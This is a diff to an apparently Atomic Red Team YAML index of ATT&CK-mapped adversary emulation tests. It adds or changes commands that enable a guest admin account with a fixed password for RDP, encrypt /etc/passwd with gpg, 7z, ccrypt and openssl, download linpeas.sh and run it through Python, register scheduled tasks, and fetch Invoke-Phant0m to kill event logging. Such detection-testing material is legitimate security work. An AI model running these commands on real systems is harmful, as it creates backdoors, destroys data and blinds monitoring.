@@ -2467,18 +2467,27 @@ privilege-escalation:
         allow multiple RDP connections
       supported_platforms:
       - windows
+      input_arguments:
+        guest_user:
+          description: Specify the guest account
+          type: String
+          default: guest
+        guest_password:
+          description: Specigy the guest password
+          type: String
+          default: Password123!
       executor:
         command: |-
-          net user guest /active:yes
-          net user guest Password123!
-          net localgroup administrators guest /add
-          net localgroup "Remote Desktop Users" guest /add
+          net user #{guest_user} /active:yes
+          net user #{guest_user} #{guest_password}
+          net localgroup administrators #{guest_user} /add
+          net localgroup "Remote Desktop Users" #{guest_user} /add
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
-          net user guest /active:no >nul 2>&1
-          net localgroup administrators guest /delete >nul 2>&1
-          net localgroup "Remote Desktop Users" guest /delete >nul 2>&1
+          net user #{guest_user} /active:no >nul 2>&1
+          net localgroup administrators #{guest_user} /delete >nul 2>&1
+          net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
         name: command_prompt
@@ -5811,11 +5820,11 @@ privilege-escalation:
         sponsor_binary_path:
           description: Path of the sponsor binary (executable that will host the binary)
           type: string
-          default: C:\Windows\System32\calc.exe
+          default: C:\Windows\System32\notepad.exe
         spawnto_process_name:
           description: Name of the process to spawn
           type: string
-          default: calc
+          default: notepad
       executor:
         command: |
           . $PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1
@@ -5828,7 +5837,7 @@ privilege-escalation:
         name: powershell
     - name: RunPE via VBA
       auto_generated_guid: 3ad4a037-1598-4136-837c-4027e4fa319b
-      description: 'This module executes calc.exe from within the WINWORD.EXE process
+      description: 'This module executes notepad.exe from within the WINWORD.EXE process
 
 '
       supported_platforms:
@@ -6810,6 +6819,25 @@ privilege-escalation:
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
+    - name: WMI Invoke-CimMethod Scheduled Task
+      auto_generated_guid: e16b3b75-dc9e-4cde-a23d-dfa2d0507b3b
+      description: 'Create an scheduled task that executes notepad.exe after user
+        login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing
+        as Register-ScheduledTask cmdlet behind the scenes.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $xml = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml")
+          Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
+        cleanup_command: 'Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false
+          >$null 2>&1
+
+'
   T1053:
     technique:
       created: '2017-05-31T21:30:46.977Z'
@@ -11712,18 +11740,27 @@ persistence:
         allow multiple RDP connections
       supported_platforms:
       - windows
+      input_arguments:
+        guest_user:
+          description: Specify the guest account
+          type: String
+          default: guest
+        guest_password:
+          description: Specigy the guest password
+          type: String
+          default: Password123!
       executor:
         command: |-
-          net user guest /active:yes
-          net user guest Password123!
-          net localgroup administrators guest /add
-          net localgroup "Remote Desktop Users" guest /add
+          net user #{guest_user} /active:yes
+          net user #{guest_user} #{guest_password}
+          net localgroup administrators #{guest_user} /add
+          net localgroup "Remote Desktop Users" #{guest_user} /add
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
-          net user guest /active:no >nul 2>&1
-          net localgroup administrators guest /delete >nul 2>&1
-          net localgroup "Remote Desktop Users" guest /delete >nul 2>&1
+          net user #{guest_user} /active:no >nul 2>&1
+          net localgroup administrators #{guest_user} /delete >nul 2>&1
+          net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
         name: command_prompt
@@ -16031,6 +16068,25 @@ persistence:
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
+    - name: WMI Invoke-CimMethod Scheduled Task
+      auto_generated_guid: e16b3b75-dc9e-4cde-a23d-dfa2d0507b3b
+      description: 'Create an scheduled task that executes notepad.exe after user
+        login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing
+        as Register-ScheduledTask cmdlet behind the scenes.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $xml = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml")
+          Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
+        cleanup_command: 'Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false
+          >$null 2>&1
+
+'
   T1053:
     technique:
       created: '2017-05-31T21:30:46.977Z'
@@ -18635,7 +18691,7 @@ credential-access:
       executor:
         command: |
           mavinject $pid /INJECTRUNNING #{file_name}
-          curl #{server_name}
+          curl #{server_name} -UseBasicParsing
         name: powershell
         elevation_required: true
   T1110.004:
@@ -21471,11 +21527,19 @@ credential-access:
         wireshark_url:
           description: wireshark installer download URL
           type: url
-          default: https://2.na.dl.wireshark.org/win64/Wireshark-win64-3.2.6.exe
+          default: https://1.eu.dl.wireshark.org/win64/Wireshark-win64-3.4.5.exe
         tshark_path:
           description: path to tshark.exe
           type: path
           default: c:\program files\wireshark\tshark.exe
+        npcap_url:
+          description: npcap installed download URL
+          type: url
+          default: https://nmap.org/npcap/dist/npcap-1.31.exe
+        npcap_path:
+          description: path to npcap.sys
+          type: path
+          default: C:\Program Files\Npcap\npcap.sys
       dependency_executor_name: powershell
       dependencies:
       - description: 'tshark must be installed and in the default path of "c:\Program
@@ -21486,6 +21550,13 @@ credential-access:
         get_prereq_command: |
           Invoke-WebRequest -OutFile $env:temp\wireshark_installer.exe #{wireshark_url}
           Start-Process $env:temp\wireshark_installer.exe /S
+      - description: 'npcap must be installed.
+
+'
+        prereq_command: if (test-path "#{npcap_path}") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest -OutFile $env:temp\npcap_installer.exe #{npcap_url}
+          Start-Process $env:temp\npcap_installer.exe
       executor:
         command: '"c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
 
@@ -23414,7 +23485,145 @@ collection:
       - Linux
       - macOS
       - Windows
-    atomic_tests: []
+      identifier: T1560.002
+    atomic_tests:
+    - name: Compressing data using GZip in Python (Linux)
+      auto_generated_guid: 391f5298-b12d-4636-8482-35d9c17d53a8
+      description: 'Uses GZip from Python to compress files
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_input_file:
+          description: Path to the file that you want to compress
+          type: Path
+          default: "/etc/passwd"
+        path_to_output_file:
+          description: Path of the file that you want your .gz file to be
+          type: Path
+          default: "/tmp/passwd.gz"
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'Requires Python
+
+'
+        prereq_command: 'which_python=`which python`; $which_python -V
+
+'
+        get_prereq_command: ''
+      executor:
+        name: bash
+        elevation_required: false
+        command: '$which_python -c "import gzip;input_file=open(''#{path_to_input_file}'',
+          ''rb'');content=input_file.read();input_file.close();output_file=gzip.GzipFile(''#{path_to_output_file}'',''wb'',''compresslevel=6'');output_file.write(content);output_file.close();"
+
+'
+        cleanup_command: 'rm #{path_to_output_file}
+
+'
+    - name: Compressing data using bz2 in Python (Linux)
+      auto_generated_guid: c75612b2-9de0-4d7c-879c-10d7b077072d
+      description: 'Uses bz2 from Python to compress files
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_input_file:
+          description: Path to the file that you want to compress
+          type: Path
+          default: "/etc/passwd"
+        path_to_output_file:
+          description: Path of the file that you want your .bz2 file to be
+          type: Path
+          default: "/tmp/passwd.bz2"
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'Requires Python
+
+'
+        prereq_command: 'which_python=`which python`; $which_python -V
+
+'
+        get_prereq_command: ''
+      executor:
+        name: bash
+        elevation_required: false
+        command: '$which_python -c "import bz2;input_file=open(''#{path_to_input_file}'',''rb'');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open(''#{path_to_output_file}'',''w+'');output_file.write(bz2content);output_file.close();"
+
+'
+        cleanup_command: 'rm #{path_to_output_file}
+
+'
+    - name: Compressing data using zipfile in Python (Linux)
+      auto_generated_guid: 001a042b-859f-44d9-bf81-fd1c4e2200b0
+      description: 'Uses zipfile from Python to compress files
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_input_file:
+          description: Path to the file that you want to compress
+          type: Path
+          default: "/etc/passwd"
+        path_to_output_file:
+          description: Path of the file that you want your .zip file to be
+          type: Path
+          default: "/tmp/passwd.zip"
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'Requires Python
+
+'
+        prereq_command: 'which_python=`which python`; $which_python -V
+
+'
+        get_prereq_command: ''
+      executor:
+        name: bash
+        elevation_required: false
+        command: '$which_python -c "from zipfile import ZipFile; ZipFile(''#{path_to_output_file}'',
+          mode=''w'').write(''#{path_to_input_file}'')"
+
+'
+        cleanup_command: 'rm #{path_to_output_file}
+
+'
+    - name: Compressing data using tarfile in Python (Linux)
+      auto_generated_guid: e86f1b4b-fcc1-4a2a-ae10-b49da01458db
+      description: 'Uses tarfile from Python to compress files
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_input_file:
+          description: Path to the file that you want to compress
+          type: Path
+          default: "/etc/passwd"
+        path_to_output_file:
+          description: Path of the file that you want your .tar.gz file to be
+          type: Path
+          default: "/tmp/passwd.tar.gz"
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'Requires Python
+
+'
+        prereq_command: 'which_python=`which python`; $which_python -V
+
+'
+        get_prereq_command: ''
+      executor:
+        name: bash
+        elevation_required: false
+        command: "$which_python -c \"from zipfile import ZipFile; ZipFile('#{path_to_output_file}',
+          mode='w').write('#{path_to_input_file}')\" \n"
+        cleanup_command: 'rm #{path_to_output_file}
+
+'
   T1560.001:
     technique:
       created: '2020-02-20T21:01:25.428Z'
@@ -24257,7 +24466,7 @@ collection:
       executor:
         command: |
           mavinject $pid /INJECTRUNNING #{file_name}
-          curl #{server_name}
+          curl #{server_name} -UseBasicParsing
         name: powershell
         elevation_required: true
   T1074:
@@ -25799,10 +26008,11 @@ collection:
       - description: 'ImageMagick must be installed
 
 '
-        prereq_command: 'if import --version; then exit 0; else exit 1; fi
+        prereq_command: 'if import -help > /dev/null 2>&1; then exit 0; else exit
+          1; fi
 
 '
-        get_prereq_command: 'sudo apt-get -y install imagemagick
+        get_prereq_command: 'sudo apt-get -y install graphicsmagick-imagemagick-compat
 
 '
       executor:
@@ -28845,18 +29055,27 @@ defense-evasion:
         allow multiple RDP connections
       supported_platforms:
       - windows
+      input_arguments:
+        guest_user:
+          description: Specify the guest account
+          type: String
+          default: guest
+        guest_password:
+          description: Specigy the guest password
+          type: String
+          default: Password123!
       executor:
         command: |-
-          net user guest /active:yes
-          net user guest Password123!
-          net localgroup administrators guest /add
-          net localgroup "Remote Desktop Users" guest /add
+          net user #{guest_user} /active:yes
+          net user #{guest_user} #{guest_password}
+          net localgroup administrators #{guest_user} /add
+          net localgroup "Remote Desktop Users" #{guest_user} /add
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
           reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
         cleanup_command: |-
-          net user guest /active:no >nul 2>&1
-          net localgroup administrators guest /delete >nul 2>&1
-          net localgroup "Remote Desktop Users" guest /delete >nul 2>&1
+          net user #{guest_user} /active:no >nul 2>&1
+          net localgroup administrators #{guest_user} /delete >nul 2>&1
+          net localgroup "Remote Desktop Users" #{guest_user} /delete >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
           reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
         name: command_prompt
@@ -29275,7 +29494,7 @@ defense-evasion:
       supported_platforms:
       - windows
       executor:
-        command: |-
+        command: |
           Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
           $url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"
           $output = "$env:TEMP\Invoke-Phant0m.ps1"
@@ -29284,8 +29503,9 @@ defense-evasion:
           cd $env:TEMP
           Import-Module .\Invoke-Phant0m.ps1
           Invoke-Phant0m
-        cleanup_command: Write-Host "NEED TO Restart-Computer TO ENSURE LOGGING RETURNS"
-          -fore red
+        cleanup_command: |
+          Write-Host "NEED TO Restart-Computer TO ENSURE LOGGING RETURNS" -fore red
+          Remove-Item "$env:TEMP\Invoke-Phant0m.ps1" -ErrorAction Ignore
         name: powershell
         elevation_required: true
     - name: Impair Windows Audit Log Policy
@@ -29507,23 +29727,13 @@ defense-evasion:
           description: path to exe file
           type: path
           default: PathToAtomicsFolder\T1562.004\bin\AtomicTest.exe
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'exe file must exist on disk in users folder
-
-'
-        prereq_command: 'if (Get-Item "C:\Users\$env:UserName\AtomicTest.exe") {exit
-          0} else {exit 1}
-
-'
-        get_prereq_command: 'Copy-Item #{exe_file_path} -Destination "C:\Users\$env:UserName"
-
-'
       executor:
-        command: netsh advfirewall firewall add rule name="Atomic Test" dir=in action=allow
-          program="C:\Users\$env:UserName\AtomicTest.exe" enable=yes
-        cleanup_command: netsh advfirewall firewall delete rule name="Atomic Test"
-          | Out-Null
+        command: |
+          Copy-Item #{exe_file_path} -Destination "C:\Users\$env:UserName" -Force
+          netsh advfirewall firewall add rule name="Atomic Test" dir=in action=allow program="C:\Users\$env:UserName\AtomicTest.exe" enable=yes
+        cleanup_command: |
+          netsh advfirewall firewall delete rule name="Atomic Test" | Out-Null
+          Remove-Item C:\Users\$env:UserName\AtomicTest.exe -ErrorAction Ignore
         name: powershell
         elevation_required: true
   T1562.001:
@@ -29624,7 +29834,11 @@ defense-evasion:
         command: 'setenforce 0
 
 '
+        cleanup_command: 'setenforce 1
+
+'
         name: sh
+        elevation_required: true
     - name: Stop Crowdstrike Falcon on Linux
       auto_generated_guid: 828a1278-81cc-4802-96ab-188bf29ca77d
       description: 'Stop and disable Crowdstrike Falcon on Linux
@@ -37409,11 +37623,11 @@ defense-evasion:
         sponsor_binary_path:
           description: Path of the sponsor binary (executable that will host the binary)
           type: string
-          default: C:\Windows\System32\calc.exe
+          default: C:\Windows\System32\notepad.exe
         spawnto_process_name:
           description: Name of the process to spawn
           type: string
-          default: calc
+          default: notepad
       executor:
         command: |
           . $PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1
@@ -37426,7 +37640,7 @@ defense-evasion:
         name: powershell
     - name: RunPE via VBA
       auto_generated_guid: 3ad4a037-1598-4136-837c-4027e4fa319b
-      description: 'This module executes calc.exe from within the WINWORD.EXE process
+      description: 'This module executes notepad.exe from within the WINWORD.EXE process
 
 '
       supported_platforms:
@@ -43409,7 +43623,184 @@ impact:
       - root
       - SYSTEM
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1486
+    atomic_tests:
+    - name: Encrypt files using gpg (Linux)
+      auto_generated_guid: 7b8ce084-3922-4618-8d22-95f996173765
+      description: 'Uses gpg to encrypt a file
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        pwd_for_encrypted_file:
+          description: the password that you want for the encrypted file
+          type: String
+          default: passwd
+        encrypted_file_path:
+          description: path to the encrypted file
+          type: Path
+          default: "/tmp/passwd.gpg"
+        input_file_path:
+          description: path to the file that you want to encrypt
+          type: Path
+          default: "/etc/passwd"
+        encryption_alg:
+          description: encryption algorithm of the file
+          type: String
+          default: AES-256
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'Finds where gpg is located
+
+'
+        prereq_command: 'which_gpg=`which gpg`
+
+'
+        get_prereq_command: ''
+      executor:
+        name: bash
+        elevation_required: false
+        command: 'echo "#{pwd_for_encrypted_file}" | $which_gpg --batch --yes --passphrase-fd
+          0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}
+
+'
+        cleanup_command: 'rm #{encrypted_file_path}
+
+'
+    - name: Encrypt files using 7z (Linux)
+      auto_generated_guid: 53e6735a-4727-44cc-b35b-237682a151ad
+      description: 'Uses 7z to encrypt a file
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        pwd_for_encrypted_file:
+          description: the password that you want for the encrypted file
+          type: String
+          default: passwd
+        encrypted_file_path:
+          description: path to the encrypted file
+          type: Path
+          default: "/tmp/passwd.zip"
+        input_file_path:
+          description: path to the file that you want to encrypt
+          type: Path
+          default: "/etc/passwd"
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'Finds where 7z is located
+
+'
+        prereq_command: 'which_7z=`which 7z`
+
+'
+        get_prereq_command: ''
+      executor:
+        name: bash
+        elevation_required: false
+        command: "$which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}\n"
+        cleanup_command: |
+          $which_7z e #{encrypted_file_path}
+          rm #{encrypted_file_path}
+    - name: Encrypt files using ccrypt (Linux)
+      auto_generated_guid: '08cbf59f-85da-4369-a5f4-049cffd7709f'
+      description: 'Attempts to encrypt data on target systems as root to simulate
+        an inturruption authentication to target system. If root permissions are not
+        available then attempts to encrypt data within user''s home directory.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        cped_file_path:
+          description: path where you want your copied file to be
+          type: Path
+          default: "/tmp/passwd"
+        root_input_file_path:
+          description: path to the file that you want to be encrypted if you are root
+            user
+          type: Path
+          default: "/etc/passwd"
+        user_input_file_path:
+          description: path to file that you want to be encrypted if you are normal
+            user
+          type: Path
+          default: "~/.bash_history"
+        impact_command:
+          description: command to show impact of encryption
+          type: String
+          default: sudo su
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'Finds where ccencrypt and ccdecrypt is located and copies input
+          file
+
+'
+        prereq_command: |
+          which_ccencrypt=`which ccencrypt`
+          which_ccdecrypt=`which ccdecrypt`
+          if [[ $USER == "root" ]]; then cp #{root_input_file_path} #{cped_file_path}; else cp #{user_input_file_path} #{cped_file_path}; fi
+        get_prereq_command: ''
+      executor:
+        name: bash
+        elevation_required: false
+        command: 'if [[ $USER == "root" ]]; then $which_ccencrypt #{root_input_file_path};
+          file #{root_input_file_path}.cpt; #{impact_command}; else $which_ccencrypt
+          #{user_input_file_path}; file #{user_input_file_path}.cpt; #{impact_command};
+          fi
+
+'
+        cleanup_command: "if [[ $USER == \"root\" ]]; then mv #{cped_file_path} #{root_input_file_path};
+          else cp #{cped_file_path} #{user_input_file_path}; fi \n"
+    - name: Encrypt files using openssl (Linux)
+      auto_generated_guid: 142752dc-ca71-443b-9359-cf6f497315f1
+      description: 'Uses openssl to encrypt a file
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        private_key_path:
+          description: path to the private key
+          type: Path
+          default: "/tmp/key.pem"
+        public_key_path:
+          description: path to the public key
+          type: Path
+          default: "/tmp/pub.pem"
+        encryption_bit_size:
+          description: size of the bit of encryption
+          type: Integer
+          default: 2048
+        encrypted_file_path:
+          description: path to the encrypted file
+          type: Path
+          default: "/tmp/passwd.zip"
+        input_file_path:
+          description: path to the file that you want to encrypt
+          type: Path
+          default: "/etc/passwd"
+      dependency_executor_name: bash
+      dependencies:
+      - description: 'Finds where openssl is located
+
+'
+        prereq_command: 'which_openssl=`which openssl`
+
+'
+        get_prereq_command: ''
+      executor:
+        name: bash
+        elevation_required: false
+        command: |
+          $which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}
+          $which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}
+          $which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}
+        cleanup_command: |
+          $which_openssl rsautl -decrypt -inkey #{private_key_path} -in #{encrypted_file_path}
+          rm #{encrypted_file_path}
   T1565:
     technique:
       external_references:
@@ -47014,6 +47405,38 @@ discovery:
         command: 'nmap #{host_to_scan}'
         name: powershell
         elevation_required: true
+    - name: Port Scan using python
+      auto_generated_guid: 6ca45b04-9f15-4424-b9d3-84a217285a5c
+      description: 'Scan ports to check for listening ports with python
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        host_ip:
+          description: Host to scan.
+          type: string
+          default: 127.0.0.1
+        filename:
+          description: Location of the project file
+          type: Path
+          default: PathToAtomicsFolder\T1046\src\T1046.py
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Check if python exists on the machine
+
+'
+        prereq_command: 'if (python --version) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'echo "Python 3 must be installed manually"
+
+'
+      executor:
+        command: 'python #{filename} -i #{host_ip}
+
+'
+        name: powershell
   T1135:
     technique:
       id: attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f
@@ -47282,11 +47705,19 @@ discovery:
         wireshark_url:
           description: wireshark installer download URL
           type: url
-          default: https://2.na.dl.wireshark.org/win64/Wireshark-win64-3.2.6.exe
+          default: https://1.eu.dl.wireshark.org/win64/Wireshark-win64-3.4.5.exe
         tshark_path:
           description: path to tshark.exe
           type: path
           default: c:\program files\wireshark\tshark.exe
+        npcap_url:
+          description: npcap installed download URL
+          type: url
+          default: https://nmap.org/npcap/dist/npcap-1.31.exe
+        npcap_path:
+          description: path to npcap.sys
+          type: path
+          default: C:\Program Files\Npcap\npcap.sys
       dependency_executor_name: powershell
       dependencies:
       - description: 'tshark must be installed and in the default path of "c:\Program
@@ -47297,6 +47728,13 @@ discovery:
         get_prereq_command: |
           Invoke-WebRequest -OutFile $env:temp\wireshark_installer.exe #{wireshark_url}
           Start-Process $env:temp\wireshark_installer.exe /S
+      - description: 'npcap must be installed.
+
+'
+        prereq_command: if (test-path "#{npcap_path}") {exit 0} else {exit 1}
+        get_prereq_command: |
+          Invoke-WebRequest -OutFile $env:temp\npcap_installer.exe #{npcap_url}
+          Start-Process $env:temp\npcap_installer.exe
       executor:
         command: '"c:\Program Files\Wireshark\tshark.exe" -i #{interface} -c 5
 
@@ -54761,7 +55199,167 @@ execution:
       - Linux
       - Windows
       - macOS
-    atomic_tests: []
+      identifier: T1059.006
+    atomic_tests:
+    - name: Execute shell script via python's command mode arguement
+      auto_generated_guid: 3a95cdb2-c6ea-4761-b24e-02b71889b8bb
+      description: Download and execute shell script and write to file then execute
+        locally using Python -c (command mode)
+      supported_platforms:
+      - linux
+      input_arguments:
+        script_url:
+          description: Shell script public URL
+          type: String
+          default: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+        payload_file_name:
+          description: Name of shell script downloaded from the script_url
+          type: String
+          default: T1059.006-payload
+        executor:
+          description: Linux shell
+          type: String
+          default: sh
+        script_args:
+          description: Arguments to check for system stats, available software, process
+            details, environment paths, open sockets, and interesting files.
+          type: String
+          default: "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI,
+            IntFiles"
+      dependency_executor_name: sh
+      dependencies:
+      - description: Verify if python is in the environment variable path and attempt
+          to import requests library.
+        prereq_command: |
+          which_python=`which python`; python -V
+          $which_python -c 'import requests' 2>/dev/null; echo $?
+        get_prereq_command: 'pip install requests
+
+'
+      executor:
+        command: '$which_python -c ''import requests;import os;url = "#{script_url}";malicious_command
+          = "#{executor} #{payload_file_name} #{script_args}";session = requests.session();source
+          = session.get(url).content;fd = open("#{payload_file_name}", "wb+");fd.write(source);fd.close();os.system(malicious_command)''
+
+'
+        name: sh
+        cleanup_command: "rm #{payload_file_name}  \n"
+    - name: Execute Python via scripts (Linux)
+      auto_generated_guid: 6c4d1dcb-33c7-4c36-a8df-c6cfd0408be8
+      description: Create Python file (.py) that downloads and executes shell script
+        via executor arguments
+      supported_platforms:
+      - linux
+      input_arguments:
+        python_script_name:
+          description: Python script name
+          type: Path
+          default: T1059.006.py
+        script_url:
+          description: Shell script public URL
+          type: String
+          default: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+        payload_file_name:
+          description: Shell script file name downloaded from the script_url
+          type: String
+          default: T1059.006-payload
+        executor:
+          description: Payload or script interpreter / executor
+          type: String
+          default: sh
+        script_args:
+          description: Arguments to check for system stats, available software, process
+            details, environment paths, open sockets, and interesting files
+          type: String
+          default: "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI,
+            IntFiles"
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Requires Python
+
+'
+        prereq_command: |
+          which_python=`which python`; python -V
+          $which_python -c 'import requests' 2>/dev/null; echo $?
+        get_prereq_command: "pip install requests    \n"
+      executor:
+        command: |
+          echo 'import requests' > #{python_script_name}
+          echo 'import os' >> #{python_script_name}
+          echo 'url = "#{script_url}"' >> #{python_script_name}
+          echo 'malicious_command = "#{executor} #{payload_file_name} #{script_args}"' >> #{python_script_name}
+          echo 'session = requests.session()' >> #{python_script_name}
+          echo 'source = session.get(url).content' >> #{python_script_name}
+          echo 'fd = open("#{payload_file_name}", "wb+")' >> #{python_script_name}
+          echo 'fd.write(source)' >> #{python_script_name}
+          echo 'fd.close()' >> #{python_script_name}
+          echo 'os.system(malicious_command)' >> #{python_script_name}
+          $which_python #{python_script_name}
+        name: sh
+        cleanup_command: "rm #{python_script_name} #{payload_file_name}  \n"
+    - name: Execute Python via Python executables (Linux)
+      auto_generated_guid: 0b44d79b-570a-4b27-a31f-3bf2156e5eaa
+      description: 'Create Python file (.py) then compile to binary (.pyc) that downloads
+        an external malicious script then executes locally using the supplied executor
+        and arguments
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        python_script_name:
+          description: Name of Python script name
+          type: Path
+          default: T1059.006.py
+        script_url:
+          description: URL hosting external malicious payload
+          type: String
+          default: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+        payload_file_name:
+          description: Shell script file name downloaded from the script_url
+          type: String
+          default: T1059.006-payload
+        executor:
+          description: Payload or script interpreter / executor
+          type: String
+          default: sh
+        script_args:
+          description: Arguments to check for system stats, available software, process
+            details, environment paths, open sockets, and interesting files
+          type: String
+          default: "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI,
+            IntFiles"
+        python_binary_name:
+          description: Name of Python file to be compiled
+          type: Path
+          default: T1059.006.pyc
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'Requires Python
+
+'
+        prereq_command: |
+          which_python=`which python`; python -V
+          $which_python -c 'import requests' 2>/dev/null; echo $?
+        get_prereq_command: "pip install requests    \n"
+      executor:
+        command: |
+          echo 'import requests' > #{python_script_name}
+          echo 'import os' >> #{python_script_name}
+          echo 'url = "#{script_url}"' >> #{python_script_name}
+          echo 'malicious_command = "#{executor} #{payload_file_name} #{script_args}"' >> #{python_script_name}
+          echo 'session = requests.session()' >> #{python_script_name}
+          echo 'source = session.get(url).content' >> #{python_script_name}
+          echo 'fd = open("#{payload_file_name}", "wb+")' >> #{python_script_name}
+          echo 'fd.write(source)' >> #{python_script_name}
+          echo 'fd.close()' >> #{python_script_name}
+          echo 'os.system(malicious_command)' >> #{python_script_name}
+          $which_python -c 'import py_compile; py_compile.compile("#{python_script_name}", "#{python_binary_name}")'
+          $which_python #{python_binary_name}
+        name: sh
+        cleanup_command: 'rm #{python_binary_name} #{python_script_name} #{payload_file_name}
+
+'
   T1053.005:
     technique:
       external_references:
@@ -54975,6 +55573,25 @@ execution:
           -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\"
           -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n"
         name: powershell
+    - name: WMI Invoke-CimMethod Scheduled Task
+      auto_generated_guid: e16b3b75-dc9e-4cde-a23d-dfa2d0507b3b
+      description: 'Create an scheduled task that executes notepad.exe after user
+        login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing
+        as Register-ScheduledTask cmdlet behind the scenes.
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: |
+          $xml = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml")
+          Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
+        cleanup_command: 'Unregister-ScheduledTask -TaskName "T1053_005_WMI" -confirm:$false
+          >$null 2>&1
